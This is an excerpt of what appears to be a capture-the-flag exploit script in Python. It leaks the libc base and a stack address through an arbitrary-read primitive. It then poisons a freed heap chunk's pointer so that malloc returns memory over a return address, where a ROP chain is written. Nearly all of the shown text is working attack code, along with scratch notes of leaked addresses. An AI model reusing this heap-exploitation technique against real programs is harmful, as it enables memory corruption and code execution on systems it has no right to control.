...
def launch_attack(p):
    libc_base = arbitary_read(p, 4210736) - 0xb1690 # 4210736 = [0x404030] strlen@GLIBC_2.2.5
    print('libc_base: ', hex(libc_base))
    environ_var = libc_base + 0x3ee098
    environ_stack = arbitary_read(p, environ_var)
    print('environ_stack: ', hex(environ_stack))
    ret_add = environ_stack - 352  # env stack - rbp = 328 => env stack - rip = 320
    ...
    free(p, 1)
    free(p, 0)
    content = b'a'*(0x20 - 8) + b'\x21' + b'\x00'*7 + p64(ret_add - 8)
    malloc(p, 8, content)
    malloc(p, 8, b'a')
    malloc(p, 8, rop_chain())
...
# 0x401150 - 0x9f630
#0x404030 = 4210736 = 0x7f14ed69e690 - 0x363470 heap -> 0x7f574739a000 ... strlen -> 0x7f574744b690
